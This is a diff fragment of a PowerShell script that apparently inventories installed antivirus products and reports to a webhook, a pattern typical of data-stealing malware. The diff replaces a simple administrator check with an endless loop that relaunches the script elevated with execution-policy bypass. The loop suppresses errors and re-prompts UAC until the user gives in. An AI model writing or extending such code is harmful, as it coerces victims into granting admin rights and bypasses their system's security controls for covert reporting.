@@ -172,13 +172,19 @@ Installed Antivirus Products (By Path):
         Write-Error "Failed to send webhook message: $($_)"
     }
 
-    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
-    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-        Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show('Please run as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
-        exit
+    function Request-Admin {
+        while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+            try {
+                $proc = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
+                if ($proc) {
+                    exit
+                }
+            } catch {
+            }
+        }
     }
+    
+    Request-Admin
 
     function Show-SilentMessageBox {
         param(
